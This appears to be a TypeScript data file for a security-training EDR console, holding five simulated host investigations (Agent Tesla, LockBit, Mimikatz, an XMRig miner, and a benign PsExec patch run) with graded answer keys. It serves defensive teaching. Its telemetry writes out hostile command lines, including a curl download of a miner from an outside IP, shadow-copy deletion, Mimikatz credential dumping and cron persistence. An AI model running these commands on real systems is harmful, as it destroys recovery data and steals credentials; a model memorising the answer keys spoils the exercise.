/**
 * Self-contained EDR investigations for the standalone EDR console (/edr).
 *
 * Each is a realistic endpoint telemetry set — a process ANCESTRY (pid/ppid),
 * detections, a timeline, and one graded "which process is the payload?"
 * answer. The console renders the process tree the way CrowdStrike Falcon /
 * Defender for Endpoint do, so the student investigates a host the way they
 * would on the job: walk the tree, read command lines, look up hashes, decide.
 *
 * Malicious-process hashes reuse the REAL MalwareBazaar samples in
 * hashDatabase.ts, so "Look up hash" resolves to a genuine verdict.
 */

export type Verdict = "benign" | "suspicious" | "malicious";

export interface EdrNetConn {
  ts: string;
  direction: "outbound" | "inbound";
  remote_ip: string;
  remote_port: number;
  domain?: string;
  proto?: string;
  bytes?: number;
  method?: string;   // HTTP method — lets a browser's activity read as a request chain
  status?: number;   // HTTP status (200 / 301 / 302 …); a 3xx marks a redirect hop
  url?: string;
}

export interface EdrFileOp {
  ts: string;
  action: "write" | "read" | "delete" | "rename";
  path: string;
}

export interface EdrProcess {
  pid: number;
  ppid: number;
  name: string;
  cmdline: string;
  user: string;
  path: string;
  signed: boolean;
  sha256?: string;
  startedAt: string;      // HH:MM:SS
  verdict: Verdict;       // ground truth (drives grading; not all shown as labels)
  /** Why it's suspicious/malicious — revealed in the debrief, not up front. */
  note?: string;
  /** Per-process telemetry surfaced in the detail tabs (Falcon-style). */
  network?: EdrNetConn[];
  files?: EdrFileOp[];
}

export interface EdrDetection {
  pid: number;
  technique: string;      // MITRE ID
  name: string;
  severity: "low" | "medium" | "high" | "critical";
  /** The Indicator of Attack behaviour Falcon would show for this detection. */
  ioa?: string;
}

export interface EdrTimelineEvent {
  at: string;             // HH:MM:SS
  kind: "process" | "network" | "file" | "detection";
  pid?: number;
  text: string;
}

export interface EdrInvestigation {
  id: string;
  title: string;
  summary: string;
  host: { name: string; os: string; ip: string; user: string };
  processes: EdrProcess[];
  detections: EdrDetection[];
  timeline: EdrTimelineEvent[];
  /**
   * Autorun/persistence entries observed on THIS host (HKCU/HKLM Run keys, scheduled
   * tasks, services) — what `reg query Run` in the RTR shell reports. Derived from the
   * case's own registry telemetry; absent/empty means the host has no persistence in
   * scope, and the shell truthfully answers "no autorun entries found" rather than a
   * hard-coded key from another host/company.
   */
  autoruns?: { key: string; value: string }[];
  /** The one process the analyst should isolate/flag as the payload. */
  answer: { pid: number; explanation: string };
}

export const EDR_INVESTIGATIONS: EdrInvestigation[] = [
  // ── 1. Real malware chain: phishing macro → LOLBins → C2 beacon ──────────────
  {
    id: "phishing-beacon",
    title: "Suspicious PowerShell on FIN-WS-07",
    summary: "Defender raised an encoded-PowerShell detection on a finance workstation. Walk the process tree and find the payload that established C2.",
    host: { name: "FIN-WS-07", os: "Windows 11 23H2", ip: "10.20.4.71", user: "CORP\\r.bakker" },
    processes: [
      { pid: 1200, ppid: 1064, name: "explorer.exe", cmdline: "C:\\Windows\\explorer.exe", user: "CORP\\r.bakker", path: "C:\\Windows\\explorer.exe", signed: true, startedAt: "08:02:11", verdict: "benign" },
      { pid: 4820, ppid: 1200, name: "OUTLOOK.EXE", cmdline: "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"", user: "CORP\\r.bakker", path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", signed: true, startedAt: "09:14:03", verdict: "benign" },
      { pid: 5610, ppid: 4820, name: "WINWORD.EXE", cmdline: "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\r.bakker\\Downloads\\Invoice_4471.docm\"", user: "CORP\\r.bakker", path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", signed: true, startedAt: "09:41:52", verdict: "suspicious", note: "Word opened a macro-enabled doc (.docm) from Downloads — legitimate binary, but it should NOT be spawning a shell." },
      { pid: 6104, ppid: 5610, name: "cmd.exe", cmdline: "cmd.exe /c powershell -w hidden -enc SQBFAFgAKABOAGUAdwAt...", user: "CORP\\r.bakker", path: "C:\\Windows\\System32\\cmd.exe", signed: true, startedAt: "09:41:55", verdict: "suspicious", note: "Office spawning cmd.exe is the classic macro-execution tell. Signed LOLBin, but the parent (WINWORD) makes it anomalous." },
      { pid: 6240, ppid: 6104, name: "powershell.exe", cmdline: "powershell.exe -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQ...", user: "CORP\\r.bakker", path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", signed: true, startedAt: "09:41:56", verdict: "suspicious", note: "Encoded, hidden-window PowerShell — the downloader. Signed LOLBin abused; it fetched and ran the payload below.",
        network: [{ ts: "09:41:59", direction: "outbound", remote_ip: "45.137.22.19", remote_port: 80, domain: "cdn-msupdate.info", proto: "HTTP", bytes: 207872 }],
        files: [{ ts: "09:42:00", action: "write", path: "C:\\Users\\r.bakker\\AppData\\Roaming\\svc\\update.dll" }] },
      { pid: 6388, ppid: 6240, name: "rundll32.exe", cmdline: "rundll32.exe C:\\Users\\r.bakker\\AppData\\Roaming\\svc\\update.dll,Start", user: "CORP\\r.bakker", path: "C:\\Users\\r.bakker\\AppData\\Roaming\\svc\\update.dll", signed: false, sha256: "415dde31bb66f5a6fa3b7ec84d5c1c33c4c6c7038e897dee5b562d8ce70246a9", startedAt: "09:42:01", verdict: "malicious", note: "THE PAYLOAD. rundll32 running an UNSIGNED DLL from AppData\\Roaming — real rundll32 loads system DLLs, never user-writable ones. The hash is a known Agent Tesla sample; it beaconed to the C2 below.",
        network: [
          { ts: "09:42:04", direction: "outbound", remote_ip: "45.137.22.19", remote_port: 443, domain: "cdn-msupdate.info", proto: "TLS", bytes: 4096 },
          { ts: "09:42:34", direction: "outbound", remote_ip: "45.137.22.19", remote_port: 443, domain: "cdn-msupdate.info", proto: "TLS", bytes: 2048 },
        ],
        files: [
          { ts: "09:42:02", action: "write", path: "C:\\Users\\r.bakker\\AppData\\Roaming\\svc\\config.bin" },
          { ts: "09:42:03", action: "read", path: "C:\\Users\\r.bakker\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" },
        ] },
      { pid: 2140, ppid: 1064, name: "svchost.exe", cmdline: "C:\\Windows\\System32\\svchost.exe -k netsvcs -p", user: "NT AUTHORITY\\SYSTEM", path: "C:\\Windows\\System32\\svchost.exe", signed: true, startedAt: "08:01:40", verdict: "benign", note: "Benign noise — a real service host under SYSTEM, correct path and signer." },
      { pid: 7702, ppid: 1200, name: "chrome.exe", cmdline: "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"", user: "CORP\\r.bakker", path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", signed: true, startedAt: "09:05:22", verdict: "benign", note: "Benign — normal browser under the user, signed, correct path." },
    ],
    detections: [
      { pid: 6240, technique: "T1059.001", name: "Encoded PowerShell command line", severity: "high", ioa: "A hidden-window PowerShell decoded a Base64 blob and reached out to an external host — the download-and-execute pattern." },
      { pid: 6388, technique: "T1218.011", name: "rundll32 executing unsigned DLL from AppData", severity: "critical", ioa: "rundll32 — a signed system binary — loaded an UNSIGNED DLL from a user-writable path and immediately opened a repeating TLS connection. Signed-binary-proxy execution of a payload." },
      { pid: 6104, technique: "T1059.003", name: "Office application spawned a command shell", severity: "medium", ioa: "WINWORD.EXE spawned cmd.exe. A document has no legitimate reason to launch a shell — the macro-execution tell." },
    ],
    timeline: [
      { at: "09:41:52", kind: "process", pid: 5610, text: "WINWORD.EXE opened Invoice_4471.docm (macro-enabled) from Downloads" },
      { at: "09:41:55", kind: "process", pid: 6104, text: "WINWORD spawned cmd.exe with an encoded PowerShell one-liner" },
      { at: "09:41:56", kind: "process", pid: 6240, text: "cmd launched powershell.exe -enc (hidden window)" },
      { at: "09:41:59", kind: "network", pid: 6240, text: "powershell → GET http://45.137.22.19/u/update.dll (203 KB written to AppData\\Roaming\\svc\\)" },
      { at: "09:42:01", kind: "process", pid: 6388, text: "powershell launched rundll32.exe update.dll,Start (unsigned)" },
      { at: "09:42:04", kind: "network", pid: 6388, text: "rundll32 → TLS beacon to 45.137.22.19:443 every 30s" },
      { at: "09:42:05", kind: "detection", pid: 6388, text: "Defender: Behavior:Win32/Agenttesla — quarantine FAILED (in use)" },
    ],
    autoruns: [
      { key: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", value: "Updater   REG_SZ   rundll32.exe C:\\Users\\r.bakker\\AppData\\Roaming\\svc\\update.dll,Start" },
    ],
    answer: {
      pid: 6388,
      explanation: "rundll32.exe (pid 6388) is the payload: an UNSIGNED DLL run from AppData\\Roaming (rundll32 should only load system DLLs), a known Agent Tesla hash, and the process that beaconed to 45.137.22.19. WINWORD→cmd→powershell is the delivery chain that dropped it, but the persistent malicious implant is the rundll32/DLL.",
    },
  },

  // ── 2. False positive: looks scary, is a legitimate admin/software action ────
  {
    id: "benign-psexec",
    title: "PsExec from the jump host — RES-SRV-02",
    summary: "An alert fired on PsExec spawning processes on a server. Investigate the tree — is this an attacker moving laterally, or sanctioned admin activity?",
    host: { name: "RES-SRV-02", os: "Windows Server 2022", ip: "10.20.9.12", user: "CORP\\svc_patch" },
    processes: [
      { pid: 640, ppid: 4, name: "services.exe", cmdline: "C:\\Windows\\System32\\services.exe", user: "NT AUTHORITY\\SYSTEM", path: "C:\\Windows\\System32\\services.exe", signed: true, startedAt: "02:00:01", verdict: "benign" },
      { pid: 3120, ppid: 640, name: "PSEXESVC.exe", cmdline: "C:\\Windows\\PSEXESVC.exe", user: "NT AUTHORITY\\SYSTEM", path: "C:\\Windows\\PSEXESVC.exe", signed: true, startedAt: "02:14:07", verdict: "suspicious", note: "PsExec's service (signed by Microsoft/Sysinternals) — used by attackers AND by every admin/patch tool. Context decides." },
      { pid: 5044, ppid: 3120, name: "powershell.exe", cmdline: "powershell.exe -File C:\\Scripts\\Patch-Cycle.ps1 -Ring 2", user: "CORP\\svc_patch", path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", signed: true, startedAt: "02:14:09", verdict: "benign", note: "Runs a NAMED script from C:\\Scripts by the patch service account, on schedule, from the sanctioned jump host — not encoded, not hidden. This is the monthly patch cycle." },
      { pid: 5210, ppid: 5044, name: "wusa.exe", cmdline: "wusa.exe C:\\Patches\\windows10.0-kb5040442.msu /quiet /norestart", user: "CORP\\svc_patch", path: "C:\\Windows\\System32\\wusa.exe", signed: true, startedAt: "02:14:31", verdict: "benign", note: "Windows Update Standalone Installer applying a real KB — exactly what a patch script does." },
    ],
    detections: [
      { pid: 3120, technique: "T1569.002", name: "Service execution via PsExec (PSEXESVC)", severity: "medium" },
      { pid: 5044, technique: "T1059.001", name: "PowerShell spawned by remote service", severity: "low" },
    ],
    timeline: [
      { at: "02:14:05", kind: "network", pid: 3120, text: "Inbound SMB from 10.20.9.3 (JUMP-01, the sanctioned admin jump host)" },
      { at: "02:14:07", kind: "process", pid: 3120, text: "PSEXESVC.exe installed & started (signed, Sysinternals)" },
      { at: "02:14:09", kind: "process", pid: 5044, text: "PsExec ran powershell -File C:\\Scripts\\Patch-Cycle.ps1 as svc_patch" },
      { at: "02:14:31", kind: "process", pid: 5210, text: "Script invoked wusa.exe to install KB5040442" },
      { at: "02:16:50", kind: "process", text: "Change ticket CHG-20418 window: 02:00–04:00, 'Monthly server patch — Ring 2'" },
    ],
    answer: {
      pid: -1,
      explanation: "This is a FALSE POSITIVE — benign admin activity. Every signal is sanctioned: source is the admin jump host (JUMP-01), the account is svc_patch, PowerShell runs a NAMED script (not encoded/hidden), it installs a real KB via wusa, it's inside change window CHG-20418, and it runs on schedule at 02:14. PsExec is dual-use; here the context is unambiguously legitimate. Nothing to isolate — resolve as benign and note the change ticket.",
    },
  },

  // ── 3. Human-operated ransomware: recovery inhibition → mass encryption ──────
  {
    id: "lockbit-ransomware",
    title: "Mass file encryption on FS-SRV-04",
    summary: "Shadow copies were just deleted and files are being renamed en masse on a file server. Walk the tree — find the encryptor that is the impact, and contain the host before it spreads.",
    host: { name: "FS-SRV-04", os: "Windows Server 2022", ip: "10.20.7.40", user: "CORP\\svc_backup" },
    processes: [
      { pid: 700, ppid: 4, name: "services.exe", cmdline: "C:\\Windows\\System32\\services.exe", user: "NT AUTHORITY\\SYSTEM", path: "C:\\Windows\\System32\\services.exe", signed: true, startedAt: "01:59:40", verdict: "benign" },
      { pid: 3560, ppid: 700, name: "explorer.exe", cmdline: "C:\\Windows\\explorer.exe", user: "CORP\\svc_backup", path: "C:\\Windows\\explorer.exe", signed: true, startedAt: "22:14:02", verdict: "benign" },
      { pid: 4102, ppid: 3560, name: "powershell.exe", cmdline: "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC4A...", user: "CORP\\svc_backup", path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", signed: true, startedAt: "22:41:10", verdict: "suspicious", note: "Hands-on-keyboard operator: hidden encoded PowerShell loading a Cobalt Strike beacon before the ransomware stage.", sha256: "dfcfb9d9e92004fe8ed31789a3791a8f57ee892b55245360e00da328e1ccb0bd",
        network: [{ ts: "22:41:14", direction: "outbound", remote_ip: "193.42.33.15", remote_port: 443, domain: "api-telemetry-sync.com", proto: "TLS", bytes: 8192 }] },
      { pid: 4550, ppid: 4102, name: "cmd.exe", cmdline: "cmd.exe /c vssadmin delete shadows /all /quiet", user: "CORP\\svc_backup", path: "C:\\Windows\\System32\\cmd.exe", signed: true, startedAt: "22:52:01", verdict: "suspicious", note: "Launches the recovery-inhibition commands — the last step before encryption." },
      { pid: 4560, ppid: 4550, name: "vssadmin.exe", cmdline: "vssadmin.exe delete shadows /all /quiet", user: "CORP\\svc_backup", path: "C:\\Windows\\System32\\vssadmin.exe", signed: true, startedAt: "22:52:01", verdict: "suspicious", note: "Deleting ALL Volume Shadow Copies so the victim can't restore. Signed Windows tool, but no admin deletes every shadow copy at 22:52." },
      { pid: 4570, ppid: 4550, name: "bcdedit.exe", cmdline: "bcdedit.exe /set {default} recoveryenabled No", user: "CORP\\svc_backup", path: "C:\\Windows\\System32\\bcdedit.exe", signed: true, startedAt: "22:52:03", verdict: "suspicious", note: "Disables Windows recovery — same recovery-inhibition playbook." },
      { pid: 5120, ppid: 4102, name: "LB3.exe", cmdline: "C:\\Users\\svc_backup\\AppData\\Local\\Temp\\LB3.exe -pass 9a1c... -del", user: "CORP\\svc_backup", path: "C:\\Users\\svc_backup\\AppData\\Local\\Temp\\LB3.exe", signed: false, sha256: "f2da3d1410c5058720a4307acf5fec7fc2b54285be9dd89eae108cce368dcde7", startedAt: "22:53:20", verdict: "malicious", note: "THE PAYLOAD. Unsigned binary from AppData\\Local\\Temp, a known LockBit 3.0 hash. It is the process renaming files to .lockbit and dropping the ransom note — the actual impact.",
        files: [
          { ts: "22:53:22", action: "write", path: "C:\\Shares\\Finance\\2026-Q3-forecast.xlsx.lockbit" },
          { ts: "22:53:22", action: "write", path: "C:\\Shares\\Finance\\HLJkNskOq.README.txt" },
          { ts: "22:53:23", action: "rename", path: "C:\\Shares\\HR\\payroll.accdb → payroll.accdb.lockbit" },
        ] },
    ],
    detections: [
      { pid: 4102, technique: "T1059.001", name: "Cobalt Strike beacon via encoded PowerShell", severity: "high", ioa: "Hidden-window PowerShell decoded a payload and opened a repeating TLS beacon to an external host — the operator's C2 before the ransomware stage." },
      { pid: 4560, technique: "T1490", name: "Inhibit System Recovery — vssadmin delete shadows /all", severity: "high", ioa: "All Volume Shadow Copies were deleted and boot recovery disabled seconds apart — the canonical pre-encryption move to stop the victim restoring." },
      { pid: 5120, technique: "T1486", name: "Data Encrypted for Impact — mass rename to .lockbit", severity: "critical", ioa: "An unsigned binary from a temp path is renaming files to a fixed extension and dropping an identical README in every folder — active ransomware encryption." },
    ],
    timeline: [
      { at: "22:41:10", kind: "process", pid: 4102, text: "Encoded PowerShell loaded a Cobalt Strike beacon (C2 193.42.33.15)" },
      { at: "22:52:01", kind: "process", pid: 4560, text: "vssadmin delete shadows /all /quiet — all shadow copies removed" },
      { at: "22:52:03", kind: "process", pid: 4570, text: "bcdedit disabled Windows recovery" },
      { at: "22:53:20", kind: "process", pid: 5120, text: "LB3.exe launched from AppData\\Local\\Temp (unsigned)" },
      { at: "22:53:22", kind: "file", pid: 5120, text: "Files renamed to *.lockbit; HLJkNskOq.README.txt dropped in every folder" },
      { at: "22:53:25", kind: "detection", pid: 5120, text: "Defender: Ransom:Win32/LockBit — remediation FAILED (files already encrypting)" },
    ],
    answer: {
      pid: 5120,
      explanation: "LB3.exe (pid 5120) is the payload — the encryptor. It's an UNSIGNED binary run from AppData\\Local\\Temp with a known LockBit 3.0 hash, and it's the process actually renaming files to .lockbit and dropping the ransom note (T1486). The encoded PowerShell (4102) was the operator's beacon and the vssadmin/bcdedit steps (4560/4570) inhibited recovery, but the impact — and what you contain the host to stop — is the encryptor itself.",
    },
  },

  // ── 4. Credential theft: LSASS memory dump (Mimikatz) ────────────────────────
  {
    id: "lsass-credential-theft",
    title: "LSASS access from an unsigned tool on IT-ADM-02",
    summary: "A process just opened a read handle into LSASS on an admin workstation. Walk the tree — is this a credential-dumping tool, and which process is it?",
    host: { name: "IT-ADM-02", os: "Windows 11 23H2", ip: "10.20.5.22", user: "CORP\\t.admin" },
    processes: [
      { pid: 900, ppid: 4, name: "winlogon.exe", cmdline: "C:\\Windows\\System32\\winlogon.exe", user: "NT AUTHORITY\\SYSTEM", path: "C:\\Windows\\System32\\winlogon.exe", signed: true, startedAt: "07:40:11", verdict: "benign" },
      { pid: 1044, ppid: 900, name: "lsass.exe", cmdline: "C:\\Windows\\System32\\lsass.exe", user: "NT AUTHORITY\\SYSTEM", path: "C:\\Windows\\System32\\lsass.exe", signed: true, startedAt: "07:40:12", verdict: "benign", note: "The target, not the threat: LSASS holds credential material in memory. It's a legitimate system process — the suspicious part is who OPENED it." },
      { pid: 3300, ppid: 900, name: "explorer.exe", cmdline: "C:\\Windows\\explorer.exe", user: "CORP\\t.admin", path: "C:\\Windows\\explorer.exe", signed: true, startedAt: "08:12:40", verdict: "benign" },
      { pid: 4200, ppid: 3300, name: "powershell.exe", cmdline: "powershell.exe -nop -w hidden -enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQA...", user: "CORP\\t.admin", path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", signed: true, startedAt: "10:03:55", verdict: "suspicious", note: "Hidden encoded PowerShell — the loader that staged the dumping tool below." },
      { pid: 4260, ppid: 4200, name: "mk.exe", cmdline: "mk.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", user: "CORP\\t.admin", path: "C:\\Users\\t.admin\\AppData\\Roaming\\mk.exe", signed: false, sha256: "a66d1021e54269963e9a54892869d569ffa1c74d9fb1b67f023ea5fdfd90c1a6", startedAt: "10:04:12", verdict: "malicious", note: "THE PAYLOAD. Unsigned binary whose command line is textbook Mimikatz (privilege::debug / sekurlsa::logonpasswords) and whose hash is a known Mimikatz sample. It opened a PROCESS_VM_READ handle into lsass.exe to scrape credentials.",
        files: [{ ts: "10:04:14", action: "write", path: "C:\\Users\\t.admin\\AppData\\Roaming\\creds.txt" }] },
    ],
    detections: [
      { pid: 4200, technique: "T1059.001", name: "Encoded PowerShell loader", severity: "high", ioa: "A hidden-window PowerShell decoded and staged a tool from a Base64 blob — the delivery step for the credential dumper." },
      { pid: 4260, technique: "T1003.001", name: "OS Credential Dumping — LSASS Memory", severity: "critical", ioa: "An unsigned process opened a handle to lsass.exe with PROCESS_VM_READ and walked its memory — the signature of Mimikatz sekurlsa::logonpasswords. Cleartext and NTLM credentials were exposed." },
    ],
    timeline: [
      { at: "10:03:55", kind: "process", pid: 4200, text: "Encoded PowerShell loader launched from explorer" },
      { at: "10:04:12", kind: "process", pid: 4260, text: "mk.exe launched from AppData\\Roaming (unsigned)" },
      { at: "10:04:13", kind: "detection", pid: 4260, text: "EDR: handle to lsass.exe opened with PROCESS_VM_READ from an unsigned image" },
      { at: "10:04:14", kind: "file", pid: 4260, text: "creds.txt written to AppData\\Roaming (dumped credentials)" },
    ],
    answer: {
      pid: 4260,
      explanation: "mk.exe (pid 4260) is the payload — a renamed Mimikatz. It's UNSIGNED, its command line is the classic privilege::debug / sekurlsa::logonpasswords, its hash matches a known Mimikatz sample, and it opened a read handle into lsass.exe to scrape credentials (T1003.001). lsass.exe itself (1044) is a legitimate system process — the target, not the threat. Contain the host and force a password reset for every account that had a session on it.",
    },
  },

  // ── 5. Linux: SSH foothold → coin miner + cron persistence ───────────────────
  {
    id: "linux-cryptominer",
    title: "Sustained CPU + mining traffic on prod-web-03",
    summary: "A Linux web server is pinned at 100% CPU and talking to a mining pool. Walk the process tree from the SSH session — find the miner and its persistence.",
    host: { name: "prod-web-03", os: "Ubuntu 22.04 LTS", ip: "10.30.2.15", user: "deploy" },
    processes: [
      { pid: 1, ppid: 0, name: "systemd", cmdline: "/sbin/init", user: "root", path: "/sbin/init", signed: true, startedAt: "00:00:01", verdict: "benign" },
      { pid: 910, ppid: 1, name: "sshd", cmdline: "sshd: deploy [priv]", user: "root", path: "/usr/sbin/sshd", signed: true, startedAt: "03:11:40", verdict: "benign", note: "Accepted an SSH session for 'deploy' from 45.9.148.203 (a hosting-provider IP, not the office range) after a burst of failed attempts." },
      { pid: 2140, ppid: 910, name: "bash", cmdline: "-bash", user: "deploy", path: "/usr/bin/bash", signed: true, startedAt: "03:11:41", verdict: "benign" },
      { pid: 2150, ppid: 2140, name: "curl", cmdline: "curl -s -o /tmp/.x/kworker http://185.220.101.44/x86_64/xmrig", user: "deploy", path: "/usr/bin/curl", signed: true, startedAt: "03:12:03", verdict: "suspicious", note: "Pulling a binary into a hidden /tmp/.x directory — the download step.",
        network: [{ ts: "03:12:03", direction: "outbound", remote_ip: "185.220.101.44", remote_port: 80, proto: "HTTP", bytes: 5242880 }] },
      { pid: 2160, ppid: 2140, name: "chmod", cmdline: "chmod +x /tmp/.x/kworker", user: "deploy", path: "/usr/bin/chmod", signed: true, startedAt: "03:12:05", verdict: "suspicious", note: "Making the downloaded file executable — masqueraded as the kernel 'kworker' thread." },
      { pid: 2200, ppid: 2140, name: "kworker", cmdline: "/tmp/.x/kworker --url stratum+tcp://pool.minexmr-eu.com:3333 --user 4A9x... --coin monero", user: "deploy", path: "/tmp/.x/kworker", signed: false, startedAt: "03:12:07", verdict: "malicious", note: "THE PAYLOAD. An XMRig coin miner masquerading as the kernel 'kworker' thread, running from /tmp/.x and speaking the Stratum mining protocol to a Monero pool — that's the pinned CPU.",
        network: [
          { ts: "03:12:08", direction: "outbound", remote_ip: "51.15.77.90", remote_port: 3333, domain: "pool.minexmr-eu.com", proto: "TCP", bytes: 1024 },
          { ts: "03:13:08", direction: "outbound", remote_ip: "51.15.77.90", remote_port: 3333, domain: "pool.minexmr-eu.com", proto: "TCP", bytes: 2048 },
        ] },
      { pid: 2210, ppid: 2140, name: "crontab", cmdline: "crontab -l ; echo '@reboot /tmp/.x/kworker ...' | crontab -", user: "deploy", path: "/usr/bin/crontab", signed: true, startedAt: "03:12:40", verdict: "suspicious", note: "Installs an @reboot cron job so the miner survives a restart — persistence." },
    ],
    detections: [
      { pid: 2150, technique: "T1105", name: "Ingress Tool Transfer — binary pulled to /tmp/.x", severity: "medium", ioa: "curl downloaded an executable over plain HTTP into a hidden temp directory from a bulletproof-hosting IP." },
      { pid: 2200, technique: "T1496", name: "Resource Hijacking — XMRig coin miner", severity: "high", ioa: "A process masquerading as 'kworker' from /tmp is sustaining ~100% CPU and speaking the Stratum protocol to a Monero pool — cryptojacking." },
      { pid: 2210, technique: "T1053.003", name: "Scheduled Task/Job: Cron persistence", severity: "medium", ioa: "An @reboot cron entry was added pointing at the miner binary so it restarts after a reboot." },
    ],
    timeline: [
      { at: "03:11:40", kind: "process", pid: 910, text: "SSH accepted for 'deploy' from 45.9.148.203 (hosting-provider IP) after failed attempts" },
      { at: "03:12:03", kind: "network", pid: 2150, text: "curl → GET http://185.220.101.44/x86_64/xmrig into /tmp/.x/kworker" },
      { at: "03:12:07", kind: "process", pid: 2200, text: "kworker (XMRig) started — Stratum to pool.minexmr-eu.com:3333" },
      { at: "03:12:40", kind: "process", pid: 2210, text: "@reboot cron entry added for the miner (persistence)" },
      { at: "03:13:08", kind: "detection", pid: 2200, text: "EDR: sustained high CPU + Stratum mining protocol — Resource Hijacking" },
    ],
    answer: {
      pid: 2200,
      explanation: "kworker (pid 2200) is the payload — an XMRig coin miner masquerading as the kernel worker thread. It runs from /tmp/.x (unsigned, world-writable path), pins the CPU, and speaks the Stratum protocol to a Monero pool (T1496). curl (2150) fetched it and the crontab entry (2210) persists it, but the impact is the miner. Kill it, remove the cron entry and /tmp/.x, and rotate the 'deploy' SSH credentials — the foothold was that account.",
    },
  },
];

export function findInvestigation(id: string): EdrInvestigation | undefined {
  return EDR_INVESTIGATIONS.find(i => i.id === id);
}

/** Build a pid→children map for tree rendering. Roots = ppid not in the set. */
export function buildProcessTree(procs: EdrProcess[]): { roots: EdrProcess[]; childrenOf: Map<number, EdrProcess[]> } {
  const byPid = new Set(procs.map(p => p.pid));
  const childrenOf = new Map<number, EdrProcess[]>();
  const roots: EdrProcess[] = [];
  for (const p of procs) {
    if (byPid.has(p.ppid)) {
      const list = childrenOf.get(p.ppid) ?? [];
      list.push(p);
      childrenOf.set(p.ppid, list);
    } else {
      roots.push(p);
    }
  }
  return { roots, childrenOf };
}
